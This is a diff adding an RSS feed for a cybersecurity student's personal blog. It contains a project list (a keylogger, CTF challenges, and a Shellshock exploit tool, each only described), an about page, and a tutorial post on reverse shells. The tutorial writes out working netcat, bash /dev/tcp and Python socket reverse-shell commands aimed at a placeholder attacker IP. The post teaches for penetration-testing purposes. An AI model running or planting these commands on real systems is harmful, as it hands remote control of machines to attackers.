@@ -1,0 +1,247 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>YunchoHang</title>
+    <link>http://localhost:1313/</link>
+    <description>Recent content on YunchoHang</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Fri, 28 Feb 2025 17:44:51 +0545</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>My Projects</title>
+      <link>http://localhost:1313/showcase/</link>
+      <pubDate>Fri, 28 Feb 2025 17:44:51 +0545</pubDate>
+      
+      <guid>http://localhost:1313/showcase/</guid>
+      <description>Keylogger for x11 Environment Simple Keylogger tool built using C for educational purpose, designed for Linux environment.
+View on Github The Lost Flag Capture the flag (CTF) challenges created using Docker.
+View on Github Steganography Tools A Python-based tool that hides data within other files such as Images, Videos, and Audios.
+View on Github AutoShocker An Automation tool that exploits the Shellshock Vulnerability to execute commands remotely and establish a reverse shell on the system.</description>
+      <content>&lt;h1 id=&#34;keylogger-for-x11-environment&#34;&gt;Keylogger for x11 Environment&lt;/h1&gt;
+&lt;p&gt;Simple Keylogger tool built using C for educational purpose, designed for Linux environment.&lt;/p&gt;
+&lt;a href=&#34;https://github.com/YunchoHang/KeyLogger-C&#34; class=&#34;btn&#34; target=&#34;_blank&#34;&gt;
+    View on Github
+&lt;/a&gt;
+
+&lt;style&gt;
+    .btn {
+        display: inline-block;
+        padding: 12px 30px;
+        font-size: 14px;
+        color: #f0f5f1;
+        background-color: transparent;
+        border: 2px solid #3a878c;
+        border-radius: 4px;
+        text-align: center;
+        text-decoration: none;
+        cursor: pointer;
+        transition: background-color 0.3s;
+        font-weight: bold;
+    }
+
+    .btn:hover {
+        background-color: #45a049;
+    }
+    .btn:focus {
+        outline: none;
+}
+&lt;/style&gt;
+
+
+&lt;h1 id=&#34;the-lost-flag&#34;&gt;The Lost Flag&lt;/h1&gt;
+&lt;p&gt;Capture the flag (CTF) challenges created using Docker.&lt;/p&gt;
+&lt;a href=&#34;https://github.com/YunchoHang/TheLostFlag&#34; class=&#34;btn&#34; target=&#34;_blank&#34;&gt;
+    View on Github
+&lt;/a&gt;
+
+&lt;style&gt;
+    .btn {
+        display: inline-block;
+        padding: 12px 30px;
+        font-size: 14px;
+        color: #f0f5f1;
+        background-color: transparent;
+        border: 2px solid #3a878c;
+        border-radius: 4px;
+        text-align: center;
+        text-decoration: none;
+        cursor: pointer;
+        transition: background-color 0.3s;
+        font-weight: bold;
+    }
+
+    .btn:hover {
+        background-color: #45a049;
+    }
+    .btn:focus {
+        outline: none;
+}
+&lt;/style&gt;
+
+
+&lt;h1 id=&#34;steganography-tools&#34;&gt;Steganography Tools&lt;/h1&gt;
+&lt;p&gt;A Python-based tool that hides data within other files such as Images, Videos, and Audios.&lt;/p&gt;
+&lt;a href=&#34;https://github.com/YunchoHang/Steganography_PY&#34; class=&#34;btn&#34; target=&#34;_blank&#34;&gt;
+    View on Github
+&lt;/a&gt;
+
+&lt;style&gt;
+    .btn {
+        display: inline-block;
+        padding: 12px 30px;
+        font-size: 14px;
+        color: #f0f5f1;
+        background-color: transparent;
+        border: 2px solid #3a878c;
+        border-radius: 4px;
+        text-align: center;
+        text-decoration: none;
+        cursor: pointer;
+        transition: background-color 0.3s;
+        font-weight: bold;
+    }
+
+    .btn:hover {
+        background-color: #45a049;
+    }
+    .btn:focus {
+        outline: none;
+}
+&lt;/style&gt;
+
+
+&lt;h1 id=&#34;autoshocker&#34;&gt;AutoShocker&lt;/h1&gt;
+&lt;p&gt;An Automation tool that exploits the Shellshock Vulnerability to execute commands remotely and establish a reverse shell on the system.&lt;/p&gt;
+&lt;a href=&#34;https://github.com/YunchoHang/CVE-2014-6271-SHELLSHOCK&#34; class=&#34;btn&#34; target=&#34;_blank&#34;&gt;
+    View on Github
+&lt;/a&gt;
+
+&lt;style&gt;
+    .btn {
+        display: inline-block;
+        padding: 12px 30px;
+        font-size: 14px;
+        color: #f0f5f1;
+        background-color: transparent;
+        border: 2px solid #3a878c;
+        border-radius: 4px;
+        text-align: center;
+        text-decoration: none;
+        cursor: pointer;
+        transition: background-color 0.3s;
+        font-weight: bold;
+    }
+
+    .btn:hover {
+        background-color: #45a049;
+    }
+    .btn:focus {
+        outline: none;
+}
+&lt;/style&gt;
+
+
+</content>
+    </item>
+    
+    <item>
+      <title>WHOAMI</title>
+      <link>http://localhost:1313/about/</link>
+      <pubDate>Thu, 27 Feb 2025 20:27:18 +0545</pubDate>
+      
+      <guid>http://localhost:1313/about/</guid>
+      <description>Hey, I’m YunchoHang! I’m a cybersecurity student passionate about securing digital systems and exploring the Linux environment. I also enjoy creating websites and innovative projects that challenge my skills and knowledge.
+From printing out &amp;ldquo;Hello World!&amp;rdquo; to working on some awesome projects, I am continuously expanding my skill set and tackling complex problems.
+TryHackMe Badge: Skills C program Python Bash scripting Docker Web Building Hobbies Listening to Music [My Spotify] Enjoy Watching Football Traveling and Bike rides Geeking on Linux (Using Kali as my daily driver).</description>
+      <content>&lt;p&gt;Hey, I’m &lt;strong&gt;YunchoHang&lt;/strong&gt;! I’m a cybersecurity student passionate about securing digital systems and exploring the Linux environment.
+I also enjoy creating websites and innovative projects that challenge my skills and knowledge.&lt;/p&gt;
+&lt;p&gt;From printing out &amp;ldquo;Hello World!&amp;rdquo; to working on some awesome projects, I am continuously expanding my skill set
+and tackling complex problems.&lt;/p&gt;
+&lt;h1 id=&#34;tryhackme-badge&#34;&gt;TryHackMe Badge:&lt;/h1&gt;
+&lt;iframe src=&#34;https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3773290&#34; 
+        style=&#34;border:none;width:100%;height:150px;&#34;&gt;
+&lt;/iframe&gt;
+
+
+&lt;h1 id=&#34;skills&#34;&gt;Skills&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;C program&lt;/li&gt;
+&lt;li&gt;Python&lt;/li&gt;
+&lt;li&gt;Bash scripting&lt;/li&gt;
+&lt;li&gt;Docker&lt;/li&gt;
+&lt;li&gt;Web Building&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;hobbies&#34;&gt;Hobbies&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Listening to Music [&lt;a href=&#34;https://open.spotify.com/playlist/3nbKCl2sIfnfwsKPLqVmZb?si=afca8c4068cb4349&#34;&gt;My Spotify&lt;/a&gt;]&lt;/li&gt;
+&lt;li&gt;Enjoy Watching Football&lt;/li&gt;
+&lt;li&gt;Traveling and Bike rides&lt;/li&gt;
+&lt;li&gt;Geeking on Linux (Using Kali as my daily driver).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure style=&#34;text-align: center; display: flex; justify-content: center; flex-direction: column; align-items: center;&#34;&gt;
+    &lt;img src=&#34;http://localhost:1313/images/agnostic.jpeg&#34; alt=&#34;agno&#34; 
+         style=&#34;width:380px; height:400px;&#34;&gt;
+    
+&lt;/figure&gt;
+
+
+&lt;h4 id=&#34;find-me-on-discordthatguysbroke-instagramhttpswwwinstagramcomyunchoohang-linkedinhttpswwwlinkedincominyunchohang-and-githubhttpsgithubcomyunchohang&#34;&gt;Find me on &lt;a href=&#34;thatguysbroke&#34;&gt;Discord&lt;/a&gt;, &lt;a href=&#34;https://www.instagram.com/yunchoohang/&#34;&gt;Instagram&lt;/a&gt;, &lt;a href=&#34;https://www.linkedin.com/in/yunchohang/&#34;&gt;LinkedIn&lt;/a&gt; and &lt;a href=&#34;https://github.com/YunchoHang&#34;&gt;Github&lt;/a&gt;!!&lt;/h4&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Reverse Shell</title>
+      <link>http://localhost:1313/posts/reverse_shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/reverse_shell/</guid>
+      <description>What is a Reverse Shell? A reverse shell is a type of shell where the target machine initiates a connection to the attacker&amp;rsquo;s machine, bypassing firewall restrictions that might block incoming connections. This method is widely used in penetration testing and malicious attacks to gain remote control access of the targets system.
+How does Reverse shell works? The attacker sets up a listener on their machine. Once the target&amp;rsquo;s machine is exploited, the attacker execute a command that starts an outbound connection to the machine.</description>
+      <content>&lt;h1 id=&#34;what-is-a-reverse-shell&#34;&gt;What is a Reverse Shell?&lt;/h1&gt;
+&lt;p&gt;A reverse shell is a type of shell where the target machine initiates a connection to the attacker&amp;rsquo;s machine, bypassing firewall restrictions that might block incoming connections. This method is widely used in penetration testing and malicious attacks to gain remote control access of the targets system.&lt;/p&gt;
+&lt;h2 id=&#34;how-does-reverse-shell-works&#34;&gt;How does Reverse shell works?&lt;/h2&gt;
+&lt;p&gt;The attacker sets up a listener on their machine. Once the target&amp;rsquo;s machine is exploited, the attacker execute a command that starts an outbound connection to the machine.Then the attacker receives the connection and gain remote access to executes commands on the target&amp;rsquo;s machine.&lt;/p&gt;
+&lt;h2 id=&#34;some-common-reverse-shell-method&#34;&gt;Some Common Reverse Shell Method:&lt;/h2&gt;
+&lt;p&gt;Reverse shell can be established using various programming languages and tools. Here I will show you some of the commonly used methods.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Netcat (nc)&lt;/strong&gt;&lt;br&gt;
+Netcat is simple yet very powerful networking tool that can be used for reverse shells. This is how you can get reverse shell using netcat.&lt;br&gt;
+On the attacker machine set up netcat listener using:&lt;br&gt;
+&lt;code&gt;nc -lvnp &amp;lt;Port&amp;gt;&lt;/code&gt;&lt;br&gt;
+On the Target&amp;rsquo;s machine execute the following command:&lt;br&gt;
+&lt;code&gt;nc.traditional -e &amp;lt;Lhost_IP&amp;gt; &amp;lt;Port&amp;gt;&lt;/code&gt;&lt;br&gt;
+&lt;em&gt;Output:&lt;/em&gt;
+&lt;img alt=&#34;Using Netcat&#34; src=&#34;http://localhost:1313/images/b1/nc.png&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Bash Reverse Shell&lt;/strong&gt;&lt;br&gt;
+A bash one liner can be used to establish a reverse shell.&lt;br&gt;
+&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;Lhost_IP/&amp;lt;Port&amp;gt; 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;br&gt;
+Make sure to setup netcat listener before executing the command.&lt;br&gt;
+&lt;em&gt;Output:&lt;/em&gt;
+&lt;img alt=&#34;Using Bash&#34; src=&#34;http://localhost:1313/images/b1/bash.png&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Python Reverse Shell&lt;/strong&gt;&lt;br&gt;
+Python is most used language for crafting tools among hackers. Copy the script below and run it on the target machine using python3.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Python&#34; data-lang=&#34;Python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;subprocess&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;os
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET,socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;Lhost_IP&amp;gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dup2(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fileno(),&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dup2(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fileno(),&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dup2(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fileno(),&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pty
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pty&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;spawn(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;Output:&lt;/em&gt;
+&lt;img alt=&#34;Using python&#34; src=&#34;http://localhost:1313/images/b1/py.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;final-thoughts&#34;&gt;Final Thoughts!&lt;/h2&gt;
+&lt;p&gt;Reverse shells are a powerful tool in both penetration testing and cyberattacks. Understanding how they works is important for both offensive and
+defensive cybersecurity. While attackers use them to gain access, security professionals must implement proper measures to detect and prevent these threats.&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
